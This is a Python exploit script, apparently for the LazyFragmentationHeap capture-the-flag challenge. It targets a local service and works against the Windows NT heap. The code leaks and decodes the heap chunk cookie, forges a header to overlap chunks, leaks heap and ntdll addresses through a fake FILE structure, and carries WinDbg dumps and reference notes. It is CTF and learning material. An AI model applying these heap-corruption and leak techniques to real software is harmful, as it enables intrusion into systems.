'''
https://www.nirsoft.net/kernel_struct/vista/iobuf.html
https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html
https://github.com/scwuaptx/LazyFragmentationHeap/blob/master/exp.py
https://labs.bluefrostsecurity.de/blog.html/2022/08/16/windows-segment-heap-attacking-the-vs-allocator/#lsb-technique-overflowing-the-least-significant-byte
https://illmatics.com/Understanding_the_LFH.pdf
https://blog.lamarranet.com/wp-content/uploads/2021/09/WinDbg-Cheat-Sheet.pdf
'''

import socket
import struct
from time import sleep


class Connection:

    def __init__(self):
        self.sock = socket.socket()
        self.sock.connect(("127.0.0.1", 6666))

    def send(self, data: bytes):
        self.sock.send(data)

    def tobytes(self, data: str):
        return bytes(data, "utf-8")

    def recv_until(self, end: str):
        _end = self.tobytes(end)
        buf = b""
        while _end not in buf:
            buf += self.sock.recv(1)
        return buf

    def next(self):
        self.recv_until(":")

    def alloc(self, size: int, id: int):
        self.next()
        self.send(b"1\n")
        self.next()
        self.send(self.tobytes(str(size) + "\n"))
        self.next()
        self.send(self.tobytes(str(id) + "\n"))

    def edit(self, id: int, data: bytes):
        self.next()
        self.send(b"2\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))
        self.next()
        self.send(data)

    def show(self, id: int):
        self.next()
        self.send(b"3\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))
        self.next()
        # buf = self.recv_until("A" * 0x228)
        # return buf

    def free(self, id: int):
        self.next()
        self.send(b"4\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))

    def openFile(self):
        self.next()
        self.send(b"5\n")
        self.next()
        self.send(b"1\n")
        self.next()
        self.send(b"3\n")

    def readFile(self, size: int, id: int):
        self.next()
        self.send(b"5\n")
        self.next()
        self.send(b"2\n")
        self.next()
        self.send(self.tobytes(str(id) + "\n"))
        self.next()
        self.send(self.tobytes(str(size) + "\n"))
        self.next()
        self.send(b"3\n")


'''
https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version
Slide 20 - slide ...
Heap Chunk header (0x002322010023)
0x0023 - Previous size >> 4
0x22 - SmallTagIndex (first three bytes xor'd together(0x01 ^ 0x00 ^ 0x23))
0x01 -Flag (is chunk in use?????)
0x0023 size of chunk >> 4 (includes 0x8 byte header (0x0000002322010023))

Header is xor'd with _HEAP->encoding
xoring known value with xor'd value gives _HEAP->encoding
'''


def pack32(num: int):
    return struct.pack("<I", num)


def pack64(num: int):
    return struct.pack("<Q", num)


def main():
    knownDecodedCookie = 0x2322010023

    conn = Connection()
    # Leak Heap Cookie
    for i in range(6):
        conn.openFile()
    conn.alloc(0x228, 1)
    conn.alloc(0x228, 2)
    conn.alloc(0x228, 3)
    conn.edit(1, b"A" * 0x228)
    conn.show(1)
    conn.recv_until("A" * 0x228)
    sleep(.1)
    knownEncodedCookie = conn.sock.recv(8)
    knownEncodedCookie = int.from_bytes(
        knownEncodedCookie[:-2].ljust(8, b"\x00"), "little")

    print(hex(knownEncodedCookie))
    heapEncoding = knownEncodedCookie ^ knownDecodedCookie & 0xffffffffffff

    # Create Overlapped Heap Chunk
    conn.alloc(0x268, 4)
    conn.alloc(0x5a0, 5)
    conn.alloc(0x1000, 6)
    conn.alloc(0x280, 7)
    conn.alloc(0x280, 0x12345678)  # cookie ^ 0x37010137)
    conn.openFile()
    conn.readFile(0x268, 4)
    fakeDecodedCookie = 0x27ae0101ae
    fakeEncodeCookie = heapEncoding ^ fakeDecodedCookie
    conn.edit(4, b"A" * 0x268 + struct.pack("<Q", fakeEncodeCookie))
    conn.free(5)

    # Leak Heap Address
    conn.alloc(0x5a0, 5)
    conn.show(6)
    sleep(.1)
    conn.next()
    heap = conn.sock.recv(8)
    print(heap)

    if heap == b' \r\n*****':
        print("heap fucked 69420")
        conn.send(b"6\n")
        return
    heap = heap[1:][:-1].ljust(8, b"\x00")
    print(heap)
    heap = int.from_bytes(heap, "little")
    print(hex(heap))
    if heap & 0xffff == 0x150:
        print("Gottem")
        heap = heap - 0x150
        print(f"Heap addr: {hex(heap)}")
    elif heap > 0x10000:
        heap = heap & 0xffffffffffff0000
        print("Gottem &")
        print(f"Heap addr: {hex(heap)}")
    else:
        input("heap fucked")

    for _ in range(0x14):
        conn.openFile()

    input("check fp")
    fake_FILE = b""
    # _heap_entry (0x10 len)
    # fake_FILE += pack64(0) * 2
    # cursor of SEEK_CUR, _HEAP->LockVariable->Lock
    fake_FILE += pack64(heap + 0x2C0)
    # base address, &_HEAP
    fake_FILE += pack64(heap)
    # remaining file size
    fake_FILE += pack32(0x800)
    # some val (persistent)
    fake_FILE += pack32(0x2041)
    # dunno
    fake_FILE += pack64(9)
    fake_FILE += pack64(0x1000)
    fake_FILE += pack64(0)
    fake_FILE += pack64(0xffffffffffffffff)
    fake_FILE += pack64(0xffffffff)
    fake_FILE += pack64(0)
    fake_FILE += pack64(0)
    fake_FILE += pack32(0xfa0)
    fake_FILE += pack32(0)

    for_leak = b""
    # for_leak += pack64(0) * 14
    for_leak += fake_FILE * int((0x1000 / len(fake_FILE)))

    conn.edit(6, for_leak)
    input("check edited fp")
    conn.alloc(0x228, 8)
    conn.readFile(228, 8)
    conn.show(8)
    sleep(.1)
    heap_lock = conn.sock.recv(8)
    ntdll = int.from_bytes(heap_lock[1:][:-1].ljust(8, b"\x00"), "little")
    ntdll += 0x8d190
    print(f"Ntdll: {hex(ntdll)}")

    input("end")
    conn.send(b"6\n")


if __name__ == "__main__":
    main()

'''
Ldr.InLoadOrderModuleList:           00000174f0163820
heap_base + 00003820 
'''

'''
0000025e`9953f0e0  0000025e`995419c8
0000025e`9953f0e8  0000025e`99541760
0000025e`9953f0f0  00002041`000004dd
0000025e`9953f0f8  00000000`00000009
0000025e`9953f100  00000000`00001000
0000025e`9953f108  00000000`00000000
0000025e`9953f110  ffffffff`ffffffff
0000025e`9953f118  00000000`ffffffff
0000025e`9953f120  00000000`00000000
0000025e`9953f128  00000000`00000000
0000025e`9953f130  00000000`00000fa0
'''
'''
00000260`ff970c30  00000000`00000000
00000260`ff970c38  00000000`00000000
00000260`ff970c40  00002001`00000000
00000260`ff970c48  00000000`0000001d
00000260`ff970c50  00000000`00000000
00000260`ff970c58  00000000`00000000
00000260`ff970c60  ffffffff`ffffffff
00000260`ff970c68  00000000`ffffffff
00000260`ff970c70  00000000`00000000
00000260`ff970c78  00000000`00000000
00000260`ff970c80  00000000`00000fa0

'''

'''
https://www.nirsoft.net/kernel_struct/vista/iobuf.html
typedef struct _iobuf
    {
        CHAR * _ptr;
        LONG _cnt;
        CHAR * _base;
        LONG _flag;
        LONG _file;
        LONG _charbuf;
        LONG _bufsiz;
        CHAR * _tmpfname;
    } iobuf, *Piobuf;
'''

'''
if ID == 0; ID = 0xddaa

struct heap
{
0x0     0x00000beefdad0000
0x8     0
0x10    0
0x18    0x04
}

0x00000beefdad0000
0x0     0x0000ddaabeef1acd (after alloc)
0x8     slot one size (after alloc)
0x10    slot one ID (after alloc)
0x18    0x0000ddaabeef1acd (after alloc)
0x20    slot one heap alloc addr

0000015d`f7925840
0000015d`f7927960
0000015d`f7927960
'''
